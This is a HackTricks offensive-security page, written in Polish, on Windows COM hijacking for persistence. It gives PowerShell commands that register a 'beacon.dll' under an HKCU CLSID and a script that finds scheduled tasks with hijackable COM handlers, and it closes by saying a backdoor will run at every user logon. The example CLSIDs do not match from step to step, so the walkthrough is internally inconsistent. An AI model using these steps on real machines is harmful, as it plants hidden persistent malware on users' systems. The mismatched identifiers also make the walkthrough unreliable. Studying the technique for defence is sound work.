# COM Hijacking

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

### Szukanie nieistniejących komponentów COM

Ponieważ wartości HKCU mogą być modyfikowane przez użytkowników, **COM Hijacking** może być używane jako **mechanizm persistentny**. Używając `procmon`, łatwo jest znaleźć wyszukiwane rejestry COM, które nie istnieją, które atakujący mógłby stworzyć, aby uzyskać persistencję. Filtry:

* Operacje **RegOpenKey**.
* gdzie _Wynik_ to **NAME NOT FOUND**.
* i _Ścieżka_ kończy się na **InprocServer32**.

Gdy zdecydujesz, który nieistniejący COM chcesz udawać, wykonaj następujące polecenia. _Bądź ostrożny, jeśli zdecydujesz się udawać COM, który jest ładowany co kilka sekund, ponieważ to może być przesadą._
```bash
New-Item -Path "HKCU:Software\Classes\CLSID" -Name "{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}"
New-Item -Path "HKCU:Software\Classes\CLSID\{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}" -Name "InprocServer32" -Value "C:\beacon.dll"
New-ItemProperty -Path "HKCU:Software\Classes\CLSID\{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}\InprocServer32" -Name "ThreadingModel" -Value "Both"
```
### Hijackowalne komponenty COM harmonogramu zadań

Zadania systemu Windows używają niestandardowych wyzwalaczy do wywoływania obiektów COM, a ponieważ są one wykonywane przez Harmonogram zadań, łatwiej jest przewidzieć, kiedy zostaną uruchomione.

<pre class="language-powershell"><code class="lang-powershell"># Pokaż CLSID COM
$Tasks = Get-ScheduledTask

foreach ($Task in $Tasks)
{
if ($Task.Actions.ClassId -ne $null)
{
if ($Task.Triggers.Enabled -eq $true)
{
$usersSid = "S-1-5-32-545"
$usersGroup = Get-LocalGroup | Where-Object { $_.SID -eq $usersSid }

if ($Task.Principal.GroupId -eq $usersGroup)
{
Write-Host "Nazwa zadania: " $Task.TaskName
Write-Host "Ścieżka zadania: " $Task.TaskPath
Write-Host "CLSID: " $Task.Actions.ClassId
Write-Host
}
}
}
}

# Przykładowy wynik:
<strong># Nazwa zadania:  Przykład
</strong># Ścieżka zadania:  \Microsoft\Windows\Przykład\
# CLSID:  {1936ED8A-BD93-3213-E325-F38D112938E1}
# [więcej jak poprzedni...]</code></pre>

Sprawdzając wynik, możesz wybrać jeden, który będzie wykonywany **za każdym razem, gdy użytkownik się loguje**, na przykład.

Teraz szukając CLSID **{1936ED8A-BD93-3213-E325-F38D112938EF}** w **HKEY\_**_**CLASSES\_**_**ROOT\CLSID** oraz w HKLM i HKCU, zazwyczaj stwierdzisz, że wartość nie istnieje w HKCU.
```bash
# Exists in HKCR\CLSID\
Get-ChildItem -Path "Registry::HKCR\CLSID\{1936ED8A-BD93-3213-E325-F38D112938EF}"

Name           Property
----           --------
InprocServer32 (default)      : C:\Windows\system32\some.dll
ThreadingModel : Both

# Exists in HKLM
Get-Item -Path "HKLM:Software\Classes\CLSID\{01575CFE-9A55-4003-A5E1-F38D1EBDCBE1}" | ft -AutoSize

Name                                   Property
----                                   --------
{01575CFE-9A55-4003-A5E1-F38D1EBDCBE1} (default) : MsCtfMonitor task handler

# Doesn't exist in HKCU
PS C:\> Get-Item -Path "HKCU:Software\Classes\CLSID\{01575CFE-9A55-4003-A5E1-F38D1EBDCBE1}"
Get-Item : Cannot find path 'HKCU:\Software\Classes\CLSID\{01575CFE-9A55-4003-A5E1-F38D1EBDCBE1}' because it does not exist.
```
Następnie możesz po prostu utworzyć wpis HKCU, a za każdym razem, gdy użytkownik się loguje, twoje tylne drzwi zostaną uruchomione.

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
